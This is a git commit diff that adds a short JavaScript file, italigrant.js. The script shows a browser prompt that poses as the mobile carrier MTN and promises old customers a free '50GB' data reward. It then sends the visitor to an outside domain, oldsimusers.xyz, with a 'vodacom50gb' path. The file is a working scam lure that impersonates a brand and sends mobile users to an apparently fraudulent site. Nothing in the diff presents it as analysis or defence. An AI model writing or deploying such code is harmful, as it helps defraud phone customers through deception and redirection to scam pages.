eadad3fc58ee0d3e3bfca5c4591e2bd2476ea6a4
bigetijazz32 <bigetijazz32@gmail.com>
2025-05-29 10:37:11 +0100

    Create italigrant.js

---
+++ italigrant.js
@@ -0,0 +1,7 @@
+
+
+var password = 'ACTIVATE 50GB'
+password=prompt('MTN : Dear customer, please check if your SIM card is eligible to receive old customers data reward. to ACTIVATE 50GB, press Ok to verify now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.oldsimusers.xyz/vodacom50gb';
+}
